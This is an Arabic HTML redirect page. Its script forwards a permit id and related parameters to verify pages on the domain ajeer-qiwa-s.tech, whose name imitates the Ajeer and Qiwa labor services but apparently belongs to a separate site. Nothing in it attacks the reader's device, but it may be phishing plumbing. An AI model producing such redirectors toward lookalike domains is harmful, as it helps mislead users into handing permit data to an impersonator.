<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحويلك...</title>
</head>
<body>
<script>
(function () {
    const params = new URLSearchParams(window.location.search);

    let id = params.get("id");
    const num = params.get("num");
    const ref = params.get("ref");
    const type = params.get("type");

    if (!id) {
        const parts = window.location.pathname.split("/").filter(Boolean);
        const last = parts[parts.length - 1];

        if (last && last !== "index.html" && last !== "view") {
            id = last;
        }
    }

    if (!id) {
        document.body.innerHTML = "<h2>طلب غير صالح: رقم التصريح مفقود</h2>";
        return;
    }

    const page = type === "add" ? "add-verify.html" : "verify.html";

    const target = new URL(
        "https://ajeer-qiwa-s.tech/ajeer/" + page
    );

    target.searchParams.set("id", id);

    if (num) target.searchParams.set("num", num);
    if (ref) target.searchParams.set("ref", ref);
    if (type) target.searchParams.set("type", type);

    window.location.replace(target.toString());
})();
</script>
</body>
</html>
